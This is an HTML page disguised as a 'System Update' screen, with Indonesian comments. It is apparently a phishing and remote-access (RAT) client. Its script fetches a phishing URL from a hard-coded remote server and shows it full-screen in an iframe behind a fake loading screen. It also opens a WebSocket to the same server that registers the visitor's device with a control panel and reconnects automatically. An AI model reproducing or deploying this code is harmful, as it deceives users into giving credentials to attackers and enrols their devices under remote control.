<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        iframe { width: 100%; height: 100%; border: none; display: none; }
        
        /* Loading Screen Animation */
        #loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 9999; background: #fff; }
        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #1877f2; animation: spin 1s ease infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text-load { color: #65676b; font-size: 14px; font-weight: 500; }
    </style>
</head>
<body>

    <!-- Loading Screen -->
    <div id="loading">
        <div class="spinner"></div>
        <div class="text-load">Memuat Halaman...</div>
    </div>

    <!-- Iframe for Phishing Target -->
    <iframe id="phishFrame" src="about:blank"></iframe>

    <script>
        // 1. GANTI URL SERVER PTERODACTYL LO DI SINI
        var SERVER_HTTP = "http://herstoreganteng.rexypediaa.biz.id:4732";
        var SERVER_WS = "ws://herstoreganteng.rexypediaa.biz.id:4732";

        // Fungsi Ambil URL Phising dari Panel Flutter
        function getTargetUrl() {
            fetch(SERVER_HTTP + '/api/get-target')
                .then(response => response.text())
                .then(url => {
                    if (url && url.trim() !== "") {
                        var frame = document.getElementById('phishFrame');
                        frame.src = url;
                        frame.style.display = 'block';
                        document.getElementById('loading').style.display = 'none';
                    } else {
                        console.log("URL belum diset dari panel.");
                    }
                })
                .catch(error => {
                    console.log("Gagal konek ke server API.");
                });
        }

        // Fungsi Koneksi RAT (Mengirim Device ke Panel Flutter)
        function connectRAT() {
            var ws = new WebSocket(SERVER_WS);
            
            ws.onopen = function() {
                var deviceId = "web-" + Math.random().toString(36).substring(2, 10);
                var data = {
                    type: "register",
                    device_id: deviceId,
                    name: "Android WebView",
                    os: "Android WebView",
                    battery: 100
                };
                ws.send(JSON.stringify(data));
                console.log("RAT Connected: " + deviceId);
            };
            
            ws.onclose = function() {
                console.log("RAT Disconnected, retrying...");
                setTimeout(connectRAT, 5000); // Auto-reconnect
            };
        }

        // Jalankan saat HTML dibuka
        window.onload = function() {
            getTargetUrl();
            connectRAT();
        };
    </script>
</body>
</html>
